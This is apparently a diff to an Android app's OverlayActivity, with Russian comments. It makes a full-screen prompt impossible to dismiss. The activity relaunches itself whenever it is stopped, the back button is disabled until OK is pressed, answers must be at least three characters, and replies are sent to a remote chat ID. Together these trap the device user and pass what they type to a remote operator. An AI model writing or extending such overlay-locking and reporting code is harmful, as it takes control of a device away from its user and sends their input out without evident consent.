@@ -105,9 +105,8 @@ class OverlayActivity : Activity() {
 
     override fun onStop() {
         super.onStop()
-        val locked = (mode == "reply" || mode == "survey") && !done
-        if (locked) {
-            // Перезапускаем с текущим прогрессом через 400мс
+        // Блокируем все режимы (plain/reply/survey) пока не нажали ОК
+        if (!done) {
             handler.postDelayed({
                 if (!done) {
                     start(
@@ -133,8 +132,8 @@ class OverlayActivity : Activity() {
     }
 
     override fun onBackPressed() {
-        // Блокируем кнопку назад в режимах с обратной связью
-        if (mode == "plain" || done) finishAndRemoveTask()
+        // Блокируем кнопку назад пока не нажали ОК
+        if (done) finishAndRemoveTask()
     }
 
     // ── Intent → State ────────────────────────────────────────────────────────
@@ -160,7 +159,7 @@ class OverlayActivity : Activity() {
                 inputLayout.visibility  = View.GONE
                 progressView.visibility = View.GONE
                 actionBtn.text = "ОК"
-                actionBtn.setOnClickListener { finishAndRemoveTask() }
+                actionBtn.setOnClickListener { done = true; finishAndRemoveTask() }
             }
             "reply" -> {
                 subtitleView.text       = replyPrompt
@@ -199,6 +198,10 @@ class OverlayActivity : Activity() {
 
         actionBtn.setOnClickListener {
             val ans = inputField.text.toString().trim()
+            if (ans.length < 3) {
+                inputField.error = "Минимум 3 символа"
+                return@setOnClickListener
+            }
             // Обновляем или добавляем ответ
             if (idx < answers.size) answers[idx] = ans else answers.add(ans)
             showQuestion(idx + 1)
@@ -209,6 +212,10 @@ class OverlayActivity : Activity() {
 
     private fun submitReply() {
         val answer = inputField.text.toString().trim()
+        if (answer.length < 3) {
+            inputField.error = "Минимум 3 символа"
+            return
+        }
         done = true
         CoroutineScope(Dispatchers.IO).launch {
             Uploader.sendText(this@OverlayActivity, "💬 Ответ: $answer", uploadChatId)
